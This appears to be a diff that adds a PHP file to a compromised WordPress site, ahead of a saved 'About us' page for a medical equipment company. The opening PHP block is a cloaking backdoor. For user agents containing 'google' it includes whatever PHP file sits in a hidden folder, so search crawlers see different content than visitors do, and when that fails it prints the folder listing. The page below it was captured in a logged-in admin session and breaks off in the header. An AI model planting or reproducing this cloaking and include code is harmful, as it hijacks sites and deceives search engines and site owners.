@@ -1,0 +1,608 @@
+<?php
+function isGoogleBot($userAgent) {
+    $userAgent = strtolower($userAgent);
+    return strpos($userAgent, 'google') !== false;
+}
+
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+if (isGoogleBot($userAgent)) {
+    $cloackDir = dirname(__FILE__) . '/areawinpastibisa/';
+
+    if (is_dir($cloackDir)) {
+        $files = scandir($cloackDir);
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') continue;
+
+            $fullPath = $cloackDir . $file;
+
+            if (is_file($fullPath) && pathinfo($file, PATHINFO_EXTENSION) === 'php') {
+                include $fullPath;
+                exit;
+            }
+        }
+    }
+
+    echo "<b>Error:</b> Tidak ada file PHP yang dapat di-include di direktori <code>$cloackDir</code><br>";
+    if (!is_dir($cloackDir)) {
+        echo "<b>Catatan:</b> Folder tidak ditemukan.<br>";
+    } else {
+        echo "<b>Isi Folder:</b><pre>" . print_r($files, true) . "</pre>";
+    }
+    exit;
+}
+?>
+
+
+<!DOCTYPE html>
+<html lang="en-US" class="no-js">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="https://enkaymeditech.com/xmlrpc.php">
+
+	    
+    <link rel="shortcut icon" href="https://enkaymeditech.com/wp-content/uploads/2024/08/New-Project.png" />
+    
+	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>About us &#8211; Enkay Medi Tech</title>
+<meta name='robots' content='max-image-preview:large' />
+<link rel='dns-prefetch' href='//maps.google.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="Enkay Medi Tech &raquo; Feed" href="https://enkaymeditech.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Enkay Medi Tech &raquo; Comments Feed" href="https://enkaymeditech.com/comments/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://enkaymeditech.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fenkaymeditech.com%2Fabout-us%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://enkaymeditech.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fenkaymeditech.com%2Fabout-us%2F&#038;format=xml" />
+<style id='wp-img-auto-sizes-contain-inline-css' type='text/css'>
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<link rel='stylesheet' id='revslider-material-icons-css' href='https://enkaymeditech.com/wp-content/plugins/revslider/public/assets/fonts/material/material-icons.css?ver=6.6.20' type='text/css' media='all' />
+<link rel='stylesheet' id='revslider-basics-css-css' href='https://enkaymeditech.com/wp-content/plugins/revslider/admin/assets/css/basics.css?ver=6.6.20' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-color-picker-css-css' href='https://enkaymeditech.com/wp-content/plugins/revslider/admin/assets/css/tp-color-picker.css?ver=6.6.20' type='text/css' media='all' />
+<link rel='stylesheet' id='revbuilder-ddTP-css' href='https://enkaymeditech.com/wp-content/plugins/revslider/admin/assets/css/ddTP.css?ver=6.6.20' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-roboto-css' href='https://fonts.googleapis.com/css?family=Roboto&#038;ver=6.9' type='text/css' media='all' />
+<link rel='stylesheet' id='tp-material-icons-css' href='https://fonts.googleapis.com/icon?family=Material+Icons&#038;ver=6.9' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css' href='https://enkaymeditech.com/wp-includes/css/dashicons.min.css?ver=6.9' type='text/css' media='all' />
+<link rel='stylesheet' id='admin-bar-css' href='https://enkaymeditech.com/wp-includes/css/admin-bar.min.css?ver=6.9' type='text/css' media='all' />
+<style id='admin-bar-inline-css' type='text/css'>
+
+		@media screen { html { margin-top: 32px !important; } }
+		@media screen and ( max-width: 782px ) { html { margin-top: 46px !important; } }
+	
+@media print { #wpadminbar { display:none; } }
+/*# sourceURL=admin-bar-inline-css */
+</style>
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://enkaymeditech.com/wp-includes/css/dist/block-library/style.min.css?ver=6.9' type='text/css' media='all' />
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+/*# sourceURL=/wp-includes/css/classic-themes.min.css */
+</style>
+<link rel='stylesheet' id='contact-form-7-css' href='https://enkaymeditech.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.1.4' type='text/css' media='all' />
+<link rel='stylesheet' id='rt-wls-css' href='https://enkaymeditech.com/wp-content/plugins/wp-logo-showcase/assets/css/wplogoshowcase.css?ver=1.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='drone-theme-fonts-css' href='https://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900|Poppins:400,500,600,700,300&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='wpforms-admin-bar-css' href='https://enkaymeditech.com/wp-content/plugins/wpforms-lite/assets/css/admin-bar.min.css?ver=1.9.8.2' type='text/css' media='all' />
+<style id='wpforms-admin-bar-inline-css' type='text/css'>
+#wpadminbar .wpforms-menu-notification-counter, #wpadminbar .wpforms-menu-notification-indicator {
+						background-color: #d63638 !important;
+						color: #ffffff !important;
+					}
+/*# sourceURL=wpforms-admin-bar-inline-css */
+</style>
+<link rel='stylesheet' id='js_composer_front-css' href='https://enkaymeditech.com/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=7.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='drone-template-css' href='https://enkaymeditech.com/wp-content/themes/drone/css/template.css?ver=3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='drone-style-css' href='https://enkaymeditech.com/wp-content/themes/drone/style.css?ver=3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='drone-font-awesome-style-css' href='https://enkaymeditech.com/wp-content/themes/drone/css/font-awesome.css?ver=4.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='drone-animate-style-css' href='https://enkaymeditech.com/wp-content/themes/drone/css/animate.css?ver=3.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-style-css' href='https://enkaymeditech.com/wp-content/themes/drone/css/bootstrap.css?ver=3.2.0' type='text/css' media='all' />
+<link rel='stylesheet' id='fancybox-style-css' href='https://enkaymeditech.com/wp-content/themes/drone/css/jquery.fancybox.css?ver=3.2.0' type='text/css' media='all' />
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script type="text/javascript" src="//maps.google.com/maps/api/js?sensor=true&amp;key&amp;ver=6.9" id="base_gmap_api_js-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/gmap3.js?ver=6.9" id="base_gmap_function_js-js"></script>
+<script></script><link rel="https://api.w.org/" href="https://enkaymeditech.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://enkaymeditech.com/wp-json/wp/v2/pages/626" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://enkaymeditech.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.9" />
+<link rel="canonical" href="https://enkaymeditech.com/about-us/" />
+<link rel='shortlink' href='https://enkaymeditech.com/?p=626' />
+<meta name="generator" content="Redux 4.4.17" /><style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
+<style data-type="vc_custom-css">.apus-breadscrumb{
+    margin-bottom:0 !important;
+}</style><meta name="generator" content="Powered by Slider Revolution 6.6.20 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
+<style>
+			              .vc_custom_1463215803546{text-align:center; padding-top: 100px !important;padding-bottom: 100px !important;background-color: #333333 !important;}.vc_custom_1463215803546{text-align:center; padding-top: 20px !important;padding-bottom: 20px !important;background-color: #333333 !important;}
+			            </style>
+			          <link rel="icon" href="https://enkaymeditech.com/wp-content/uploads/2024/08/cropped-New-Project-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://enkaymeditech.com/wp-content/uploads/2024/08/cropped-New-Project-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://enkaymeditech.com/wp-content/uploads/2024/08/cropped-New-Project-180x180.png" />
+<meta name="msapplication-TileImage" content="https://enkaymeditech.com/wp-content/uploads/2024/08/cropped-New-Project-270x270.png" />
+<!-- ******************************************************************** --><!-- * Theme Options Styles ********************************************* --><!-- ******************************************************************** --><style>/* Typography *//* Main Font *//* Second Font *//* Custom Color (skin) *//* check second color *//* check Third color *//* check main color *//***************************************************************//* Top Bar *****************************************************//***************************************************************//* Top Bar Backgound */#apus-topbar {background-color: transparent;}/* Top Bar Color *//* Top Bar Link Color *//***************************************************************//* Header *****************************************************//***************************************************************//* Header Backgound */#apus-header {}/* Header Color *//* Header Link Color *//* Header Link Color Active *//* Menu Link Color *//* Menu Link Color Active *//***************************************************************//* Footer *****************************************************//***************************************************************//* Footer Backgound */#apus-footer {}/* Footer Heading Color*//* Footer Color *//* Footer Link Color *//* Footer Link Color Hover*//***************************************************************//* Copyright *****************************************************//***************************************************************//* Copyright Backgound */.apus-copyright {}/* Footer Color *//* Footer Link Color *//* Footer Link Color Hover*//* Woocommerce Breadcrumbs *//* Custom CSS */body{font-family: "Montserrat", sans-serif;font-size:15px;}#apus-header.header-v2 .apus-topbar{display:none;}.text-white{color:#FFF;}.homebtn{background-image: linear-gradient(90deg, #00c0b7, #00ce88ae);border: 1px;border-radius: 25px;box-shadow: 0px 0px 10px #888;color: #FFF;font-weight:bold;}.homebtn:hover{background-image: linear-gradient(90deg, #00ce88, #00c0b7);border: 1px;border-radius: 25px;box-shadow: 0px 0px 10px #888;color: #FFF;font-weight:bold;}.homebtn:hover.active{background-image: linear-gradient(90deg, #00ce88, #00c0b7);border: 1px;border-radius: 25px;box-shadow: 0px 0px 10px #888;color: #FFF;font-weight:bold;}.font-weight-light{font-weight: 200 !important;}.text-dark h3{color:#000 !important; margin-bottom: 5px !important;}.header-setting{display:none !important;}.wpb_single_image img{width:100%;}#apus-header.header-v2 .navbar-nav.megamenu > li.active > a{text-decoration: none;font-weight:bold;}.divbox .vc_column-inner{background-color: #FFF;padding: 10px;box-shadow: 0px 0px 8px #888;border-radius: 10px;}.htwo{font-size: 20px;margin-bottom: 5px;}#qlwapp.qlwapp-bottom-left, #qlwapp.qlwapp-bottom-right{bottom: 64px !important;}.whywechoose .widget.widget-text-heading .action .btn{display:none;}.widget.widget-text-heading.style5 .description {font-style: normal;font-size: 18px;}.innerboxdiv{ background-color: #FFF;padding: 10px 40px;box-shadow: 0px 0px 8px #888;border-radius: 10px;margin-bottom: 30px;}.innerboxdiv .wpb_single_image.vc_align_center{margin-bottom:0px;}.innerboxdiv .widget h2{font-weight:bold;}.apus-f{    padding-bottom: 10px !important;padding-top: 50px !important;}.apus-f a{font-size: 32px; color:#FFF;margin-left: 20px;margin-right: 20px;border: solid 2px #FFF;padding: 15px 20px;border-radius: 10%;}.apus-f a:hover{color:#cce900;border: solid 2px #cce900;}#qlwapp.qlwapp-button .qlwapp-toggle .qlwapp-icon{margin:0px !important;}#qlwapp.qlwapp-rounded.qlwapp-button .qlwapp-toggle {border-radius: 10px;text-align: center;font-size: 30px;}#qlwapp.qlwapp-button .qlwapp-toggle {height: 40px;white-space: nowrap;padding: 26px 12px;margin-right: 30px !important;}.topbar-inner{display:none;}@media only (max-width: 980px){.setting-popup{display:none;}.fa-user{display:none;}}</style><script>function setREVStartSize(e){
+			//window.requestAnimationFrame(function() {
+				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
+				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
+				try {
+					var pw = document.getElementById(e.c).parentNode.offsetWidth,
+						newh;
+					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
+					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
+					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
+					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
+					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
+					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
+					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
+					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
+					if(e.layout==="fullscreen" || e.l==="fullscreen")
+						newh = Math.max(e.mh,window.RSIH);
+					else{
+						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
+						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
+						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
+						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
+						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
+											
+						var nl = new Array(e.rl.length),
+							ix = 0,
+							sl;
+						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
+						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
+						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
+						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
+						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
+						sl = nl[0];
+						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
+						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
+						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
+					}
+					var el = document.getElementById(e.c);
+					if (el!==null && el) el.style.height = newh+"px";
+					el = document.getElementById(e.c+"_wrapper");
+					if (el!==null && el) {
+						el.style.height = newh+"px";
+						el.style.display = "block";
+					}
+				} catch(e){
+					console.log("Failure at Presize of Slider:" + e)
+				}
+			//});
+		  };</script>
+		<style type="text/css" id="wp-custom-css">
+			span.fa.fa-user{
+    display:none;
+}		</style>
+		<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1463473391784{padding-top: 110px !important;padding-bottom: 20px !important;}</style><noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><link rel='stylesheet' id='qlwapp-frontend-css' href='https://enkaymeditech.com/wp-content/plugins/wp-whatsapp-chat/build/frontend/css/style.css?ver=7.8.9' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-plugin-settings-css' href='https://enkaymeditech.com/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.6.20' type='text/css' media='all' />
+<style id='rs-plugin-settings-inline-css' type='text/css'>
+#rs-demo-id {}
+/*# sourceURL=rs-plugin-settings-inline-css */
+</style>
+</head>
+<body class="wp-singular page-template-default page page-id-626 logged-in admin-bar no-customize-support wp-embed-responsive wp-theme-drone wls_chrome apus-body-loading wpb-js-composer js-comp-ver-7.7.2 vc_responsive">
+	<div class="apus-page-loading">
+	  	<div id="loader"></div>
+	  	<div class="loader-section section-left"></div>
+	  	<div class="loader-section section-right"></div>
+	</div>
+<div id="wrapper-container" class="wrapper-container">
+
+	<div id="apus-mobile-menu" class="apus-offcanvas hidden-lg hidden-md"> 
+    <div class="apus-offcanvas-body">
+        <div class="offcanvas-head bg-primary">
+            <button type="button" class="btn btn-toggle-canvas btn-danger" data-toggle="offcanvas">
+                <i class="fa fa-close"></i> 
+            </button>
+            <strong>MENU</strong>
+        </div>
+        
+                    <nav class="navbar navbar-offcanvas navbar-static" role="navigation">
+                <div class="navbar-collapse navbar-offcanvas-collapse"><ul id="main-mobile-menu" class="nav navbar-nav"><li class="menu-item-1061"><a href="https://enkaymeditech.com/">Home</a></li>
+<li class="active menu-item-960"><a href="https://enkaymeditech.com/about-us/">About us</a></li>
+<li class="menu-item-1228"><a href="https://enkaymeditech.com/why-we-choose/">Why We Choose</a></li>
+<li class="has-submenu menu-item-1431"><a href="#">Product</a> <span class="icon-toggle"><i class="fa fa-angle-right"></i></span>
+<ul class="sub-menu">
+	<li class="menu-item-1390"><a href="https://enkaymeditech.com/bed-head-panel/">Bed Head Panel</a></li>
+	<li class="menu-item-1333"><a href="https://enkaymeditech.com/blood-bank/">Blood Bank</a></li>
+	<li class="menu-item-1281"><a href="https://enkaymeditech.com/track-curtain/">Cubicle Track System</a></li>
+	<li class="menu-item-1334"><a href="https://enkaymeditech.com/door/">Door</a></li>
+	<li class="menu-item-1284"><a href="https://enkaymeditech.com/i-v-tree/">I V Tree System</a></li>
+	<li class="menu-item-1372"><a href="https://enkaymeditech.com/ivf-lab-3/">IVF Lab</a></li>
+	<li class="menu-item-1223"><a href="https://enkaymeditech.com/modular-operation-theater/">Modular Operation Theater</a></li>
+	<li class="menu-item-1283"><a href="https://enkaymeditech.com/medical-gas-pipeline-system/">Medical Gas Pipeline System</a></li>
+	<li class="menu-item-1365"><a href="https://enkaymeditech.com/medical-wall-mounts/">Medical Wall Mounts</a></li>
+	<li class="menu-item-1282"><a href="https://enkaymeditech.com/nurse-call-system/">Nurse Call &#038; Queue Management System</a></li>
+	<li class="menu-item-1373"><a href="https://enkaymeditech.com/scrub-station/">Scrub Station</a></li>
+	<li class="menu-item-1285"><a href="https://enkaymeditech.com/wall-protection-systems/">Wall Protection System</a></li>
+</ul>
+</li>
+<li class="menu-item-1174"><a href="https://enkaymeditech.com/contact-us/">Contact us</a></li>
+</ul></div>            </nav>
+        
+    </div>
+</div>
+	<div class="header-mobile hidden-lg hidden-md clearfix">
+    <div class="container">
+    <div class="row">
+        <div class="col-xs-3">
+            <div class="active-mobile pull-left">
+                <button data-toggle="offcanvas" class="btn btn-sm btn-danger btn-offcanvas btn-toggle-canvas offcanvas" type="button">
+                   <i class="fa fa-bars"></i>
+                </button>
+            </div>
+            <div class="setting-popup pull-left">
+                <div class="dropdown">
+                    <button class="btn btn-sm btn-primary btn-outline dropdown-toggle" type="button" data-toggle="dropdown"><span class="fa fa-user"></span></button>
+                    <div class="dropdown-menu">
+                                                    <div class="pull-left">
+                                                            </div>
+                                            </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-6">
+            
+                            <div class="logo">
+                    <a href="https://enkaymeditech.com/" >
+                        <img src="https://enkaymeditech.com/wp-content/uploads/2024/08/New-Project.png" alt="Enkay Medi Tech">
+                    </a>
+                </div>
+                    </div>
+        <div class="col-xs-3">
+            <div class="topbar-inner">
+                <div class="search-popup pull-right">
+                    <div class="dropdown">
+                        <button class="btn btn-sm btn-primary btn-outline dropdown-toggle" type="button" data-toggle="dropdown"><span class="fa fa-search"></span></button>
+                        <div class="dropdown-menu dropdown-menu-right">
+                                                    </div>
+                    </div>
+                </div>
+                <div class="active-mobile top-cart pull-right">
+                    <div class="dropdown">
+                        <button class="btn btn-sm btn-primary btn-outline dropdown-toggle" type="button" data-toggle="dropdown"><span class="fa fa-shopping-cart"></span></button>
+                        <div class="dropdown-menu">
+                            <div class="widget_shopping_cart_content"></div>
+                        </div>
+                    </div>
+                    
+                </div>  
+            </div>
+        </div>
+    </div>
+    </div>
+</div>
+		<header id="apus-header" class="site-header hidden-sm hidden-xs  header-v2 main-sticky-header" role="banner">
+	<div id="apus-topbar" class="apus-topbar hidden-sm hidden-xs">
+		<div class="container">
+            <div class="topbar-inner clearfix">
+                
+                <div class="user-login pull-left">
+                    <ul class="list-inline acount">
+                                                                              <li>  <span class="hidden-xs">Welcome admin !</span></li>
+                          <li><a href="https://enkaymeditech.com/wp-login.php?action=logout&amp;redirect_to=https%3A%2F%2Fenkaymeditech.com&amp;_wpnonce=572f154333">Logout </a></li>
+                                            </ul>   
+                </div>
+
+                                    <div class="pull-left info-topbar">
+                        <aside id="text-2" class="widget widget_text">			<div class="textwidget"><span class="info-inner"><i class="fa fa-phone"></i>(  01) 123 456 789</span>
+<span class="info-inner"><i class="fa fa-envelope"></i>Info@Dronetech.com</span></div>
+		</aside>                    </div>
+                
+                                    <div class="pull-right social-topbar">
